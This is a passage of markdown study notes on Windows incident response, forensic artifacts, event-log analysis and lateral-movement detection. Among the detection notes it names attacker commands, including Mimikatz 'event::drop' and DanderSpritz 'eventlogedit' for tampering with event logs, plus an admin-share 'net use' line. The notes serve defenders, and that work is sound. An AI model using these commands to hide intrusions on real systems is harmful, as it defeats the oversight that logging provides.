# Notes on DFIR, Threat Hunting, and Malware Analysis

<br>

- [Incident Response](#incident-response)
  * [Incident Response Process](#incident-response-process)
  * [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
  * [Attack Lifecycle](#attack-lifecycle)
  * [IR Scripting](#ir-scripting)
    + [IR Using WMIC](#ir-using-wmic)
    + [IR Using PowerShell](#ir-using-powershell)
    + [Kansa](#kansa)
  * [Kansa Data Stacking Collection and Analysis](#kansa-data-stacking-collection-and-analysis)
    + [Stacking Autoruns](#stacking-autoruns)
    + [Stacking Services](#stacking-services)
    + [Stacking WMI Filters and Consumers](#stacking-wmi-filters-and-consumers)
- [Intrusion Analysis](#intrusion-analysis)
  * [Evidence of Execution](#evidence-of-execution)
    + [Prefetch](#prefetch)
    + [ShimCache - Application Compatibility](#shimcache---application-compatibility)
    + [Amcache.hve - Application Compatibility](#amcachehve---application-compatibility)
    + [Automating and Scaling Execution Analysis](#automating-and-scaling-execution-analysis)
  * [Event Logs Analysis](#event-logs-analysis)
    + [Location](#location)
    + [Types](#types)
    + [Profiling Account Usage](#profiling-account-usage)
    + [Brute Force Password Attack](#brute-force-password-attack)
    + [Built-In Accounts](#built-in-accounts)
    + [Tracking Administrator Account Activity](#tracking-administrator-account-activity)
    + [Auditing Account Creation](#auditing-account-creation)
    + [Remote Desktop Activity](#remote-desktop-activity)
    + [Account Logon Events](#account-logon-events)
    + [Privileged Local Account Abuse - Pass the Hash](#privileged-local-account-abuse---pass-the-hash)
    + [Account and Group Enumeration](#account-and-group-enumeration)
    + [Event Log Analysis Tools](#event-log-analysis-tools)
    + [Lateral Movement - Network Shares](#lateral-movement---network-shares)
    + [Cobalt Strike Mapping Shares](#cobalt-strike-mapping-shares)
    + [Lateral Movement - Explicit Credentials - runas](#lateral-movement---explicit-credentials---runas)
    + [Lateral Movement - Scheduled Tasks](#lateral-movement---scheduled-tasks)
    + [Suspicious Services](#suspicious-services)
    + [Event Log Clearing](#event-log-clearing)
  * [Lateral Movement Tactics](#lateral-movement-tactics)
    + [RDP - Source System Artifacts](#rdp---source-system-artifacts)
    + [RDP - Destination System Artifacts](#rdp---destination-system-artifacts)
    + [Windows Admin Shares - Source System Artifacts](#windows-admin-shares---source-system-artifacts)
    + [Windows Admin Shares -  Destination System Artifacts](#windows-admin-shares----destination-system-artifacts)
    + [PsExec - Source System Artifacts](#psexec---source-system-artifacts)
    + [PsExec - Destination System Artifacts](#psexec---destination-system-artifacts)
    + [Windows Remote Management Tools](#windows-remote-management-tools)
    + [Remote Services - Source System Artifacts](#remote-services---source-system-artifacts)
    + [Remote Services - Destination System Artifacts](#remote-services---destination-system-artifacts)
    + [Scheduled Tasks - Source System Artifacts](#scheduled-tasks---source-system-artifacts)
    + [Scheduled Tasks - Destination System Artifacts](#scheduled-tasks---destination-system-artifacts)
    + [WMI - Source System Artifacts](#wmi---source-system-artifacts)
    + [WMI - Destination System Artifacts](#wmi---destination-system-artifacts)
    + [Powershell Remoting - Source Sytem Artifacts](#powershell-remoting---source-sytem-artifacts)
- [Windows Forensics](#windows-forensics)
  * [SANS Windows Forensic Analysis Poster](#sans-windows-forensic-analysis-poster)
  * [Registy Overview](#registy-overview)
  * [Users and Groups](#users-and-groups)
  * [System Configuration](#system-configuration)
- [Threat Hunting](#threat-hunting)
  * [Common Malware Names](#common-malware-names)
  * [Common Malware Locations](#common-malware-locations)
  * [Living of the Land Binaries](#living-of-the-land-binaries)
  * [Persitence Locations](#persitence-locations)
    + [Common Autostart Locations](#common-autostart-locations)
    + [Services](#services)
    + [Scheduled Tasks](#scheduled-tasks)
    + [DLL Hijacking](#dll-hijacking)
    + [Hunting DLL Hijacking](#hunting-dll-hijacking)
    + [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
    + [Hunting WMI Persistence](#hunting-wmi-persistence)
    + [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
  * [Lateral Movement](#lateral-movement)
    + [Detecting Credential Harvesting](#detecting-credential-harvesting)
    + [Hashes](#hashes)
    + [Credential Availability on Targets](#credential-availability-on-targets)
    + [Tokens](#tokens)
    + [Cached Credentials](#cached-credentials)
    + [LSA Secrets](#lsa-secrets)
    + [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
    + [Tickets - Kerberos](#tickets---kerberos)
    + [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
    + [Kerberos Attacks](#kerberos-attacks)
    + [NTDS.DIT](#ntdsdit)
    + [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
- [Misc](#misc)
  * [Decode Base64](#decode-base64)
  * [Powershell CommandLine Switches](#powershell-commandline-switches)

<br>

---

<br>

# Incident Response

## Incident Response Process
1. Preparation
	* Creating a response capability
	* Testing response capabilites
	* Securing Systems
	* Changes to response capabilties from lessons learned
2. Identification and Scoping
	* Alert from security tools
	* Result of threat hunting
	* Notification from user
	* Hunt for additional compromise
3. Containment/Intelligence Development
	* Identify vulnerabilities or exploits
	* Persistence Techniques
	* Lateral Movement
	* Command and Control
	* IOC developement
	* Mitigative actions to slow attacker
4. Eradication/Remediation
	* Block IPs and Domains
	* Restore systems
	* Password changes
	* Vulnerability patching
	* Prevent further adversarial access
	* Remove adversarial presence
5. Recovery
	* Improve logging (SIEM)
	* Cybersecurity Awareness
	* Segmentation
	* Password policies
	* Vulnerability management
	* Network/Endpoint visibility
6. Lessons Learned/Threat Intel Consumption
	* Verify remediations
	* Penetration tests
	* Information sharing
	* Compliance verification

<br>

## Incident Response Hierarchy of Needs
<img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />

[Ref: Matt Swann](https://github.com/swannman/ircapabilities)

<br>


## Attack Lifecycle
<img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />

<br>


## IR Scripting

### IR Using WMIC
- [Running WMI Scripts Against Multiple Computers](https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee692838(v=technet.10))
- [WMIC for incident response](https://www.sans.org/blog/wmic-for-incident-response/)
- [Like a Kid in a WMIC Candy Store](https://isc.sans.edu/diary/Tip+of+the+Day+-+Like+a+Kid+in+a+WMIC+Candy+Store/1622)
- [PoSh-R2](https://github.com/WiredPulse/PoSh-R2)

Examples
```
/node:<remote-IP> | /user:<admin acct>
```
Get Auto-Start Process
```
wmic /node:10.1.1.1 startup list full
```
Remote Process List
```
wmic /node:10.1.1.1 process get
```
Network Configuration
```
wmic /node:10.1.1.1 nicconfig get
```

<br>


### IR Using PowerShell
- [Live Response Using PowerShell](https://www.sans.org/white-papers/34302/)
- [Powershell: Forensic One-liners](https://www.ldap389.info/en/2013/06/17/powershell-forensic-onliners-regex-get-eventlog/)
- [Weekend Scripter: Using PowerShell to Aid in Security Forensics](https://devblogs.microsoft.com/scripting/weekend-scripter-using-powershell-to-aid-in-security-forensics/)
- [Use PowerShell to Perform Offline Analysis of Security Logs](https://devblogs.microsoft.com/scripting/use-powershell-to-perform-offline-analysis-of-security-logs/)
- [Learn the Easy Way to Use PowerShell to Get File Hashes](https://devblogs.microsoft.com/scripting/learn-the-easy-way-to-use-powershell-to-get-file-hashes/)
- [Use PowerShell to Compute MD5 Hashes and Find Changed Files](https://devblogs.microsoft.com/scripting/use-powershell-to-compute-md5-hashes-and-find-changed-files/)

Remoting
```powershell
Enter-PSSession computername
Invoke-Command -ScriptBlock -Filepath -AsJob
```
- [The Power of PowerShell Remoting](https://www.sans.org/blog/the-power-of-powershell-remoting/)
- [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.1)
- [PowerShell Remoting Performance](https://www.hofferle.com/powershell-remoting-performance/)

Authentication
- Non-interactive (Type 3) logon
- Does not cache creds
- Creds not passed to remote system (Mimikatz, Incognito)

<br>


### Kansa
**Collection**
- [Kansa GitHub](https://github.com/davehull/Kansa)
- Uses PowerShell scripting
- Can remote run executables
- Modules.conf manages what scripts run
- Omit -TargetList and Kansa will query AD for a list of computers and target all of them
	- Requires [Remote Server Administration Tools](https://www.microsoft.com/en-us/download/details.aspx?id=39296)
- -TargetCount limits the total number of systems queried
- -PushBin required by scripts that employ 3rd party binaries (will first copy binaries to targets before running)
- -Rmbin removes binaries after execution  

```powershell
.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
```

**Analysis**
- Can pre-filter and organize data
- Located in the .\Analysis folder
- Uses "stacking" (Least Frequency of Occurence)
- "Meta" scripts loook at indicators like file size
- Example
	- LogParser (LogparserStack.ps1) to stack unsigned Autoruns output from multiple Kansa output files
	- [Computer Forensics How-To: Microsoft Log Parser](https://www.sans.org/blog/computer-forensics-how-to-microsoft-log-parser/)  

**Distributed Kansa**
- Kansa has issues scaling to 1000+ systems
- Fixed with .\DistributedKansa.ps1
- Scripts included to set up distrubted Kansa-Servers
- Modules collect and send data asynchronously to ELK
- [Kansa for Enterprise scale Threat Hunting w/ Jon Ketchum](https://www.youtube.com/watch?v=ZyTbqpc7H-M)
- [Kansa for Enterprise Scale Threat Hunting](https://www.sans.org/presentations/kansa-for-enterprise-scale-threat-hunting/)

**Enable PowerShell Remoting**
- Remoting requires that all network connections be set to something other than "Public." 

1. User ```Get-NetConnectionProfile``` to check
2. If necessary, change it to Private with ```Set-NetConnectionProfile```
```powershell
Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
```
3. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
4. Run Kansa
```powershell
.\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
```

<br>

## Kansa Data Stacking Collection and Analysis

### Stacking Autoruns

1. Run ```Get-ASEPImagePathLaunchStringStack.ps1``` against autoruns data from workstations and output to csv
```powershell
.\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 >asep-workstation-stack.csv
```

2. Note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "process name" *Autorunsc.csv
```

<br>

### Stacking Services

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on services
```powershell
.\Get-LogparserStack.ps1 -FilePattern *SvcAll.csv -Delimiter "," -Direction asc -OutFile SvcAll-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- DisplayName
	- PathName
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "tbbd05" *SvcAll.csv 
```
<br>

### Stacking WMI Filters and Consumers

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on WMI Filters
```powershell
.\Get-LogparserStack.ps1 -FilePattern *WMIEvtFilter.csv -Delimiter "," -Direction asc -OutFile WMIEvtFilter-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- Query
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "PerformanceMonitor" *WMIEvtFilter.csv
```

4. Search the Kansa WMI Binding output data
```powershell
Select-String "PerformanceMonitor" *ConBind.csv
```

5. Search the Kansa WMI Event Consumer output data
```powershell
Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
```

<br>

---

<br>

# Intrusion Analysis

## Evidence of Execution

### Prefetch
- Evidence of execution
	- Executable name, execution time(s), and execution count
- Limitations: Off by default on servers or workstations with SSDs
- .pf filename (compressed)
	- executable file name followed by dash and hexidecimal representation of a hash of the file's path
- Multiple .pf files with the same executable name can be indicative of two executables with the same name being run from different locations
	- Execeptions: hosting applications (svchost, dllhost, backgroundtaskhost, and rundll32) hash values calculated based off of commandline arguments

**Notes**
- First execution (creation date -10 seconds)
- Last execution (modified date -10 seconds)

**Analysis**
- Can be analyzed with PECmd.exe ```PECmd.exe -d "C:\Windows\Prefetch" --csv "G:\cases" -q```  
- [PECmd](https://github.com/EricZimmerman/PECmd)

<br>

### ShimCache - Application Compatibility
- Available on workstations AND Servers
- Not as easy to delete as Prefetch
- Designed to detect and remediate
- Different compatibility modes are called shims
- Tracks Name, File Path, and Last Modification Time of executable
- Executables can be added to the regirsty regradless if they've been executed
	- Executable viewed via Windows GUI apps
- After XP, ShimCache no longer include execution time
- Win7 & 8/8.1 include execution flags (Win 10 does not)
	- InsertFlag = True (App Executed)

**Win 7+**  

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache
```  

- Server 2003 = 512 Entries
- Win7-10, Server 2008-2019 = 1024 Entries

**Win XP**

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache
```  

- 96 entries

**Notes**
- Most recent activities are on the top
- New entries are only written on shutdown (only exist in memory before)
- Each "ControlSet" can have its own ShimCache database
- If the executable is modified (content changes) or renamed, it will be shimmed again
- [Leveraging the Application Compatibility Cache in Forensic Investigations](https://web.archive.org/web/20190209113245/https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf)

**Analysis**
- [AppCompatCacheParser](https://github.com/EricZimmerman/AppCompatCacheParser)

```
.\AppCompactCacheParser.exe -f .\SYSTEM --csv c:\temp
```
- Written in order of excecution or GUI discovery
- Additional tool from Mandiant: [ShimCacheParser](https://github.com/mandiant/ShimCacheParser)

<br>

### Amcache.hve - Application Compatibility
```
C:\Windows\AppCompat\Programs\Amcache.hve
```
- Win7+
- Tracks installed applications, loaded drivers, and unassociated excectuables
- Full path, file size, file modification time, compilation time, publisher metadata
- SHA1 hashes of executables and drivers
- Entries can be due to file discovery or installation and not always execution
- [ANALYSIS OF THE AMCACHE](https://www.ssi.gouv.fr/uploads/2019/01/anssi-coriin_2019-analysis_amcache.pdf)

**Analysis**
- InventoryApplicationFile
	- FileId: SHA1 Hash
	- LinkDate: PE Header Compilation Time
	- LowerCaseLongPath: Full Path
	- ProgramId: Cross-Ref with InventoryApplication key for more info
		- Unassociated (not installed) applications dont have a ProgramId
		- Malware often does not go through the installation process
	- Size: File Size
- InventoryApplication
	- Installed Application
	- Provides Installation Date
	- Publisher information
- InventoryDriverBinary
	- Keys contain file path of driver
	- DriverId: SHA1 Hash
	- DriverLastWriteTime: Modification Time of Driver
	- DriverSigned: 1 = signed
	- Product/ProductVersion = Driver Metadata
	- Rootkits are often heavily reliant on drivers
	- Most drivers in ```C:\Windows\system32\drivers\```

- Can be parsed with [AmCacheParser](https://github.com/EricZimmerman/AmcacheParser)
```
amcacheparser.exe -i -f amcache.hve --csv G:\<folder>
```
- Leverages allowlisting and blocklisting based on SHA1

<br>

### Automating and Scaling Execution Analysis
- Malware 101
	- One/two letter executables
	- Executions from temp ro $Recycle.Bin folders
- Common Tools
	- psexec.exe
	- wmic.exe
	- scrcons.exe
	- certutil.exe
	- rar.exe
	- wsmprovhost.exe
	- whoami.exe
	- schtasks.exe
- IOCs
	- Known Malware
	- Tools
	- Staging directories

**[appcompatprocessor.py](https://github.com/mbevilacqua/appcompatprocessor)**
- Performs scalable hunting of ShimCache and Amcache artifacts
- Regex Searches + built library of common anomalies
- "Reconscan" to search for grouping of known recon tools
- [ShimCache and AmCache Enterprise-wide Hunting](https://github.com/mbevilacqua/appcompatprocessor)
- Temporal correlations of execution activity

Perform a search against built-in signatures
```
AppCompatProcessor.py database.db search
```

Perform least frequency of occurence analysis
```
AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe'"
```

<br>

## Event Logs Analysis

### Location
- Server 2003 and older
	- %systemroot%\System32\config
	- .evt
- Vista and newer
	- %systemroot%\System32\winevt\logs
	- .evtx

<br>

### Types

**Security**
- Records access control and security settings
- Events based on audit and group policies
- Example: Failed logon; folder access
- User authentication
- User behavior and actions
- File/Folder/Share access

**System**
- Contains events related to Windows services, system components, drivers, resources, etc.
- Example: Service stopped; system rebooted

**Application**
- Software events unrealted to operating system
- Example: SQL server fails to access database

**Other**
- Task Scheduler
- Terminal Services
- Powershell
- WMI
- Firewall
- DNS (Servers)

<br>

### Profiling Account Usage
- Determine which accounts have been used for attempted logons
- Track account usage for known compromised accounts

**Event IDs**
- 4624: Successful Logon
- 4625: Failed Logon
- 4634/4647: Successful Logoff
- 4648: Logon using explicit credentials (RunAs)
- 4672: Account logon with superuser rights (Administrator)
- 4720/4726: An account was created/deleted

**Notes**
- Windows does not reliably record logoffs, also look for 4647 -> user initiated logoff for interactive logons
- Logon events are not recorded when backdoors, remote exploits, or similar malicous means are used to access a system

**Logon Types**  
2: Logon via console (keyboard, server KVM, or virtual client)  
3: Network logon (SMB and some RDP connections)  
4: Batch Logon -- Often used by Scheduled tasks  
5: Windows Service Logon  
7: Credentials used to lock or unlock screen; RDP session reconnect  
8: Network logon sending credentials in cleartext  
9: Different credentials used than logged on user -- RunAs/netonly  
10: Remote interactive login (Remote Desktop Protocol)  
11: Cached credentials used to log on  
12: Cached Remote Interactive (similar to Type 10)  
13: Cached unlock (similar to Type 7)  
Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)

**Identify Logon Sessions**
- Use Logon ID value to link a logon with a logoff and determine session length
- Useful for interactive logons (Type 2, 10, 11, 12)
- Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
- Admin logins generate two different sessions
	- high privilege session
	- lower privlege session

<br>

### Brute Force Password Attack
- Logon Type 3 - Could SMB or RDP
- 1 accounts and many passwords = password guessing attack
- many accounts and few passwords = password spraying attack
- [Failed Login Codes](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)

<br>

### Built-In Accounts

- SYSTEM
	- Most powerful local account; unlimited access to system

- LOCAL SERVICE
	- Limited privileges similar to authenticated user account; can access only network resources via null session

- NETWORK SERVICE
	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account

- HOSTNAME$
	- Every domain-joined windows system has a computer account

- DWM
	- Desktop window manager\Window manager group

- UMFD
	- Font driver host account

- ANONYMOUS LOGON
	- Null session w/o credentials use to authenticate with resource

**Notes**  
- Recommended to ignore in initial investigation (very noisy)

<br>

### Tracking Administrator Account Activity

- Event ID 4672
- Usually follows Event ID 4624 (Successful Logon)
- Important for:
	- Account auditing
	- Planning for password resets
	- Identifying compromised service accounts
- Scheduled tasks run with administrative privileges also trigger this

<br>

### Auditing Account Creation

- Event ID 4720
- Complementary events include
	- 4722: A user account was enabled
	- 4724: An attempt was made to reset an accounts password
	- 4728: A member was added to a security enabled global group
	- 4732: A member was added to a security enabled local group
	- 4735: A security enabled local group was changed
	- 4738: A user account was changed
	- 4756: A member was added to a security enabled universal group

<br>

### Remote Desktop Activity

- Event ID 4778 (Session Reconnected)
	- Should see 4624 (Successful logon) simultaneously
	- Session name contains "RDP"
	- Client Name: True Client Hostname (regardless of hops)
- Event ID 4779 (Session Disconnected)
	- Should see 4647 (Successful logoff) simultaneously
- Not a reliable indicator of all RDP activity (records reconnects)
	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
- Logs provide IP address and hostname
- False positive: Shared workstations (fast user switching)
	- Session Name: Console
- Source System
	- Security
		- 4648: Logon with alternate credentials
			- Current logged on username
			- Alternate user name
			- Destination hostname/ip
			- Process Name
	- TerminalServices-RdpClient
		- 1024
			- Destination hostname
		- 1102
			- Destination IP
- Destination System
	- Security
		- 4624 Type 10
			- Source IP/Logon Username
		4778/4779
			- IP address of source/source system name
			- Logon Username
	- Remote Desktop Services-RDPCoreTS
		- 131 - Connection attempts
			- Source ip/logon username
		- 98 - Successful connections
	- TerminalServices Remote Connection Manager
		- 1149
			- Source ip/logon user name
				- Blank may indicate use of sticky keys
	- Terminal Services LocalSession Manager
		- 21,22,25
			- Source IP, Logon username
		- 41
			- Logon Username
- 4624 Type 7
	- Often Unlock or RDP Reconnect

<br>

### Account Logon Events

- Different than logon events
- Recorded on system that authenticated credentials
	- Local Account/Workgroup = on workstation
	- Domain/Active Directory = on domain controller  

- Event ID codes (NTLM)
	- 4776: Successful/Failed account authentication  

- Event ID codes (Kerberos protocol)
	- 4768: TGT was granted (successful logon)
	- 4769: Service Ticket was requested (access to server resource)
	- 4771: Pre-authentication failed (failed logon)

- Anomaly: find places where authentication didnt happen on domain controller (local account)  

**Error Codes**
- 4771 - 4776/4625
	- 0x6 - 0xC0000064: Invalid Username
	- 0x7 - n/a: Requested server not found
	- 0xC - 0xC0000070: Logon from unauthorzed workstation
	- 0x12 - 0xC0000234: Account locked, disabled, or expired
	- 0x17 - 0xC0000071: Password expired
	- 0x18 - 0xC000006A: Password invalid
	- 0x25 - n/a: Clock skew between machines is too great

<br>

### Privileged Local Account Abuse - Pass the Hash

- Filter event logs for Event ID 4776 (exclude Domain Controllers)
- Identify any workstations with these events
- Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
- Review events surrounding 4776
	- 4624 (succesful logon)
		- Type 3 often indicative of share mapping or exceuting code with PsExec
	- 4672 - Privelged logon
	- 5140 - File Share event

<br>

### Account and Group Enumeration

- Event ID 4798: A user's local group was enumerated
- Event ID 4799: A security-enabled local group membership was enumerated

**Notes**

- New events starting with Win10 and Server 2016
- Focus on the process being used
	- PowerShell
	- WMIC
	- Cmd
- Filter on sensitive groups, unusual accounts, and process information
- Allowlist common processes
	- mmc.exe
	- services.exe
	- taskhostw.exe
	- explorer.exe
	- VSSSVC.exe

**Common Attack Tools**

- PowerView (PowerSploit)
- PowerShell Empire
- DeathStar

**Log Attributes**

- Account Name: Account that performed enumeration
- Group Name: Group Enumerated
- Process Name: Process used for enumeration

<br>

### Event Log Analysis Tools

- [Event Log Explorer](https://eventlogxp.com/)
	- Color Codes by Event IDs
	- Open many logs simultaneously
	- Filtering
	- Log merging (aids correlation and search time)

- [EvtxEcmd](https://github.com/EricZimmerman/evtx)
	- Xpath filters
	- Output to CSV, XML, JSON
	- Extraction of "custom" fields
	- Log merging and normalization
	- Crowd-sourced event maps
	- Noise reduction
	- Extract from VSS and de-duplicate

<br>

### Lateral Movement - Network Shares

- Event Id 5140: Network share was accessed
- Event Id 5145: Share object accessed (detailed file share auditing)

**Notes**

- Log provides share name and IP address of remote machine making connection
- Account name and logon ID allow tracking of relevant account and other activities
- Requires object access auditing to be enabled
- Event IDs 5142-5144 track share creation, modification, and deletion
- Detailed file share auditing (5145) provides detail on individual files access (can be very noisy)

<br>

### Cobalt Strike Mapping Shares

- Share Name: ```\\*\ADMIN$```
	- Windows Folder
	- Originaly designed to push patches
- Source Address: 127.0.0.1 (localhost)
	- Normally see remote host
- Account Name: COMPUTERNAME$
	- Normally see non-computer account

<br>

- Share Name: ```\\*\IPC$```
	- Sets up initial SMB connection
	- Part of authentication
	- Can be seen as part of enumeration tools
- Source Address: Remote Host
- Account Name: non-computer account

**Notes**
- Usually contains a corresponding 4624 event with Type 3 logon

Mandiant stated 24% of malware families they observed were cobalt strike

<br>

### Lateral Movement - Explicit Credentials - runas

- Track credential chagne common during lateral movement
- Event Id: 4624 (Logon Type 9)
- Event Id: 4648 (Logon using explicit credentials)

**Notes**
- Changing credentials necessary to move from system to system
- Typically only admins and attacks juggle multiple credentials
- 4648 events log on the originating system and help to identify attacker lateral movement from that system
- Logged if explicit credentials are supplied (even if no account change)
- RDP connections using different credentials often log 4648 events on both systems

**Detection**
- Originating Host - Event Id 4648
	- Subject
		- Account Name: Intitial Account Name
	- Account Whose Credentials Were Used
		- Account Name: "run as" account name
	- Target Server
		- Target Server Name: Remote Target
- Target System - Event Id 5140
	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
	- Source Address: Source IP of originating host
	- Share Name: Share accessed (IPC$, etc)
	- Computer: Computer name of remote host

**Cobalt Strike - Make Token or Pass the hash**

- EventID 4624
	- Logon Type 9 (explicit credentials)
	- "Subject - Account Name" matches "New Logon - Account Name"
	- Note Process information

<br>

- EventId 4648 (explicit credentials)
	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
	- Note Target Server Name

<br>

### Lateral Movement - Scheduled Tasks

- Log: Task Scheduler - Security
	- 106 - 4698 - Task Created
	- 140 - 4720 - Task Updated
	- 141 - 4699 - Task Deleted
- Task Scheduler
	- 200/201: Task Executed/Completed
- Security
	- 4700/4701: Task Enabled/Disabled

**Notes**
- Tasks can be executed locally and remotely
	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
- Attackers commonly delete scheduled tasks after execution
	- Hunt deleted tasks (rare)
- Tasks running executables from /Temp likey evil

**Task Scheduler Artifacts**
- XML Files
- Saved in:
	- \Windows\System32\Tasks
	- \Windows\SysWOW64\Tasks
- Includes:
	- Task Name
	- Registration date and time (local)
	- Account used to register
	- Trigger conditions and frequency
	- Full command path
	- Account authenticated to run task

<br>

### Suspicious Services

- Analyze logs for suspicious services running at boot time
	- Service type changed to Boot
- Review services started and stopped during time of a suspected hack

<br>

- System Log
	- 7034: Service Crashed Unexpectedly
	- 7035: Service sent a Start/Stop control
	- 7036: Service started or stopped
	- 7040: Start typed changed (Boot, On Request, Disabled)
	- 7045: A new service was installed on the system (Win2008R2+)
- Security Log
	- 4697: A new service was installed on the system

<br>

**Notes**
- A large amount of malware and worms in the wild utilize Services
- Services started on bot illustrate peristence
- Services can crash due to attacks like process injections

<br>

**Example - PsExec**
- Filter by 7045 (New service installed)
- Look for services not tied to Built-In accounts (SIDs)
- Everytime PsExec runs, it starts a brand new service
- Note service File Name

<br>

### Event Log Clearing
- 1102: Audit Log Cleared (Security)
- 104: Audit Log Cleared (System)

<br>

**Notes**
- Requires Admin Rights
- GUI and command-line clearing (i.e. wevutil) recorded 
- Note Account Name

**Event Log Attacks**
- Mimikatz ```event::drop```
- DanderSpritz ```eventlogedit```
- ```Invoke-Phantom``` thread killing
- Event Log service suspension; memory based attacks

<br>

**Mitigation**
- Event Log Forwarding
- Logging "heartbeat"
- Log gap analysis

<br>

## Lateral Movement Tactics

- [Hunt Evil](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf)


### RDP - Source System Artifacts
- VNC
	- 4624 Type 2 (Console)
- TeamViewer
	- TeamViewerX_Logfile.log (X = TV Version) - Source
	- Connections_incoming.txt - Destination

**Event Logs**
- Security.evtx
	- 4648 - Logon specifying alternate credentials - if NLA enabled on destination
		- Current logged on username
		- Alternate username
		- Destination Hostname/IP
		- Process Name
- Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx
	- 1024
		- Destination Hostname
	- 1102
		- Destination IP address

<br>

**Registry**
- Remote Desktop Destinations are tracked per-user
	- ```NTUSER\Software\Microsoft\Terminal Server Client\Servers```
- ShimCache - SYSTEM
	- mstsc.exe Remote Desktop Client
- BAM/DAM - SYSTEM - Last Time Executed
	- mstsc.exe Remote Desktop Client
- Amcache.hve - First Time Executed
	- mstsc.exe
- UserAssist - NTUSER.DAT
	- mstsc.exe Remote Desktop Client execution
	- Last Time Executed
	- Number of Times Executed
- RecentApps - NTUSER.DAT
	- mstsc.exe Remote Desktop Client Execution
	- Last Time Executed
	- Number of Times Executed
	- RecentItems subkey tracks connection destination and times

<br>

**File System**
- Jumplists ```C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\```
	- {MSTSC-APPID}-automaticdestinations-ms
	- Tracks remote desktop connection destination and times
- Prefetch ```C:\Windows\Prefetch\```
	- mstsc.exe-{hash}.pf
- Bitmap Cache ```C:\Users\<username>\AppData\Local\Microsoft\Terminal Server Client\Cache```
	- bcache##.bmc
	- cache####.bin
	- [Bitmap Cache Parser](https://github.com/ANSSI-FR/bmc-tools)

<br>

### RDP - Destination System Artifacts

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 10
 		- Source IP/Logon User Name
	- 4778/4779
		- IP Address of Source/Source
		- System Name
 		- Logon User Name
- Microsoft-WindowsRemoteDesktopServicesRdpCoreTS%4Operational.evtx
	- 131 – Connection Attempts
 		- Source IP
 	- 98 – Successful Connections
- Microsoft-Windows-Terminal Services-RemoteConnection Manager%4Operational.evtx
	- 1149
		- Source IP/Logon User Name
 			- Blank user name may indicate use of Sticky Keys
- Microsoft-Windows-Terminal Services-LocalSession Manager%4Operational.evtx
	- 21, 22, 25
		- Source IP/Logon User Name
	- 41
 		- Logon User Name

<br>

**Registry**
- ShimCache – SYSTEM
	- rdpclip.exe
	- tstheme.exe
- AmCache.hve – First Time Executed
 - rdpclip.exe
 - tstheme.exe

<br>

**File System**
- Prefetch ```C:\Windows\Prefetch\```
 - ```rdpclip.exe-{hash}.pf```
 - ```tstheme.exe-{hash}.pf```

<br>

### Windows Admin Shares - Source System Artifacts
- C$
- ADMIN$
- IPC$

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-SmbClient%4Security.evtx
	- 31001 – Failed logon to destination
		- Destination Host Name
		- User Name for failed logon
		- Reason code for failed destination logon (e.g. bad password)

<br>

**Registry**
- MountPoints2 – Remotely mapped shares ```NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2```
- Shellbags – USRCLASS.DAT
	- Remote folders accessed inside an interactive session via Explorer by attackers
- ShimCache – SYSTEM
	- net.exe
	- net1.exe
- BAM/DAM – NTUSER.DAT – Last Time Executed
	- net.exe
	- net1.exe
- AmCache.hve – First Time Executed
	- net.exe
	- net1.exe

	```net use z: \\host\c$ /user:domain\username <password>```

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```net.exe-{hash}.pf```
	- ```net1.exe-{hash}.pf```
- User Profile Artifacts
